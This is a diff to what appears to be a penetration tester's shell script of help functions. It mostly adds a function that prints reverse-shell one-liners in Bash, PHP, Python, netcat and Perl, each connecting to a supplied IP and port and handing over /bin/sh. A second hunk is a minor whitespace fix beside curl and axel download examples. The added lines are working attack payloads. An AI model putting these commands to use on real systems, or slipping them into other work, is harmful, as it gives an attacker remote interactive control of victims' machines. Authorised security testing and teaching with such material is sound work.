@@ -279,6 +279,14 @@ function help-msfvenom {
     help-payloads
 }
 
+function help-shells {
+echo "${red}Bash    ${white} bash -i >& /dev/tcp/$ip/$port 0>&1${reset}"
+echo "${red}PHP     ${white}php -r '$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${reset}"
+echo "${red}Python  ${white}	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+echo "${red}NC v1   ${white} nc -e /bin/sh $ip $port ${reset}"
+echo "${red}NC v2   ${white} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f${reset}"
+echo "${red}Perl    ${white} perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+}
 
 function help-upgradeshell {
     help-shellupgrade
@@ -334,7 +342,7 @@ function help-filetransfer-http {
     # curl
     curl -o report.pdf https://www.someplace.com/report_you_want.pdf
 
-    # axel 
+    # axel
     axel -a -n 20 -o report_axel.pdf https://www.someplace.com /reports/-sample-report-2013.pdf
 
     # nc
